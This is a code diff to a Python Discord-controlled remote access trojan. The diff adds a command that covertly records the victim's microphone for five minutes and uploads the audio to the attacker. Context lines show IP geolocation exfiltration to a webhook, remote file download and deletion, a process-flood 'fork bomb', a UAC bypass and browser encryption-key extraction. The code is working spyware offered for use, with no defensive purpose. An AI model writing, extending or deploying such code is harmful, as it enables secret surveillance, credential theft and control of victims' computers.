@@ -22,6 +22,10 @@ import sys
 import ctypes
 import uuid
 from PIL import Image  
+import pynput
+import pyaudio
+import wave
+import threading
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -37,6 +41,36 @@ intents = discord.Intents.default()
 intents.message_content = True  
 
 bot = commands.Bot(command_prefix="!", intents=intents)
+
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
+RECORD_SECONDS = 300
+AUDIO_FILE = "mic.wav"
+
+def record_audio():
+    """Function to record audio."""
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, input=True,
+                    frames_per_buffer=CHUNK)
+
+    frames = []
+
+    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    with wave.open(AUDIO_FILE, 'wb') as wf:
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
 
 def get_encryption_key(browser="chrome"):
     try:
@@ -256,10 +290,10 @@ async def ip(ctx):
             ip_info = "Failed to get IP info."
 
         
-        payload = {"content": f"**IP Geolocation Report**\n{ip_info}"}
+        payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
         requests.post(WEBHOOK_URL, json=payload)
 
-        await ctx.send("Sent IP geolocation to the webhook!")
+        await ctx.send("Sent IP to webhook")
 
     except Exception as e:
         await ctx.send(f"Error: {e}")
@@ -326,9 +360,9 @@ async def download(ctx, file_path: str):
             await ctx.send(file=discord.File(file_path))
             await ctx.send(f"File '{file_path}' sent successfully!")
         else:
-            await ctx.send(f"❌ File '{file_path}' does not exist.")
+            await ctx.send(f"File '{file_path}' does not exist.")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f"Error: {e}")
 
 @bot.command()
 async def delete(ctx, file_path: str):
@@ -347,7 +381,7 @@ async def delete(ctx, file_path: str):
 async def forkbomb(ctx):
     for _ in range(1000):
         subprocess.Popen(['notepad.exe'])
-    await ctx.send('Opened Notepad 1000 times!')
+    await ctx.send('Executed fork bomb..')
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
@@ -411,6 +445,36 @@ async def jumpscare(ctx):
         await ctx.send("Jumpscare image has been displayed!")
     else:
         await ctx.send("Failed to load the image.")
+
+
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
+RECORD_SECONDS = 300  
+AUDIO_FILE = "mic.wav"
+
+@bot.command()
+async def mic(ctx):
+    
+    await ctx.send("Recording their MIC")
+
+    
+    thread = threading.Thread(target=record_audio)
+    thread.start()
+
+    
+    thread.join()  
+
+    
+    if os.path.exists(AUDIO_FILE):
+        await ctx.send("Sending file..")
+        await ctx.send(file=discord.File(AUDIO_FILE))
+
+        
+        os.remove(AUDIO_FILE)
+    else:
+        await ctx.send("No audio file was created.")
 
 
 bot.run(TOKEN)
